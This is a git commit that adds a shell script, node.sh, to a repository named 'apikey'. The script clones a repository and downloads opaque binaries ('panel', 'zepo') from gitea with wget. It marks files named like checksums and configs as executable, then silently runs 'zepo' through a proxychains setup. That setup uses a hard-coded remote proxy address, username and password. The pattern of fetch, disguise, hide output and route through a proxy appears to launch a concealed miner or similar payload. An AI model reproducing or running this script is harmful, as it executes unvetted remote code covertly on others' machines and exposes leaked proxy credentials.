babefd55a56ce190b623f88ad97024afc9c5255a
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-10 13:59:31 +0700

    Create node.sh

---
+++ node.sh
@@ -0,0 +1,26 @@
+proxy="50.17.160.202" 
+port="1080" 
+user="s0xa2xicwh8i36"  
+pass="811noty1dt532rfecresmotogphkbd" 
+git clone https://github.com/55113110159/apikey.git>/dev/null 2>&1
+cd apikey
+chmod +x SHA256SUMS
+chmod +x config.json
+chmod +x zepo
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./zepo -c "config.json" >/dev/null 2>&1
